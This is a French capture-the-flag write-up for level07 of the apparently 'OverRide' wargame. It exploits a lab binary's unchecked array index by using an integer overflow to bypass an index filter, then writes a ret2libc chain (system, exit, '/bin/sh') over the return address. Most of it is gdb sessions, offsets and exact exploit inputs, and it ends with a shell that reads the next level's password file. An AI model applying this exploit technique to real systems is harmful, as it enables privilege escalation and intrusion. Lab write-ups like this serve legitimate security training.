# Level07

On se retrouve avec un programme interactive qui permet de stocker des nombres dans un tableau une fois desassembler et le code reecrit en C on s'apercoit que les nombres sont stocke dans un tableau de int de taille `100` et ne faisant aucun check de limite d'index

N'ayant ni condition pour executer un shell et une initialisation de l'environnement a 0 nous empechant de stocker un shellcode on va utiliser la technique de `ret2libc`

Premierement nous devons trouver la distance entre `EIP` et le debut de notre buffer

Pour l'adresse de notre buffer:

```bash
=> 0x08048791 <+110>:	lea    ebx,[esp+0x24]

(gdb) x/x $esp + 0x24
0xffffd554:	0x00000000
```

Pour l'adresse de `EIP`:

```bash
(gdb) i f 
Stack level 0, frame at 0xffffd720:
 eip = 0x8048791 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c <-------
```

```bash
(gdb) p 0xffffd71c - 0xffffd554
$4 = 456

(gdb)  p 456 / 4
$6 = 114 <-----
```

C'est a dire pour ecraser l'adresse de retour nous devons utiliser le `114eme` index de notre tableau

Le probleme que l'on rencontre cette fois ci c'est que le proprietaire du programme nous interdit d'uitiliser les index qui sont multiple de 3

```c
if ((index % 3 == 0) || (number >> 24 == 0xb7)) {
	puts(" *** ERROR! ***");
	puts("   This index is reserved for wil!");
	puts(" *** ERROR! ***");
	return 1;
}
```

En regardant cette ligne dans la fonction `read_number` on voit qu'il y'a un cast en `unsigned int` donnant la possiblite de faire un `integer overflow`
```c
printf("Number at data[%u] is %u\n", index, *(unsigned int *)(index * 4 + data));
```

```python
>>> 2**32 + 456
4294967752
>>> 4294967752 / 4
1073741938.0
>>> 1073741938 % 3
1
```

On peut bien voir qu'on arrive a ecraser l'adresse de retour qui est accessible a l'index `114` avec `0x41414141` tout en contournant la condition
```bash
(gdb) b *0x080489f1
Breakpoint 1 at 0x80489f1
(gdb) continue 
The program is not being run.
(gdb) run 
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store 
 Number: 1094795585
 Index: 1073741938
 Completed store command successfully
Input command: quit

Breakpoint 1, 0x080489f1 in main ()
(gdb) continue 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Pour les adresses de `system` `exit` et `/bin/sh`
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) p/d 0xf7e6aed0
$3 = 4159090384
(gdb) p/d 0xf7e5eb70
$4 = 4159040368
(gdb) p/d 0xf7f897ec
$5 = 4160264172
```

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
********************************
```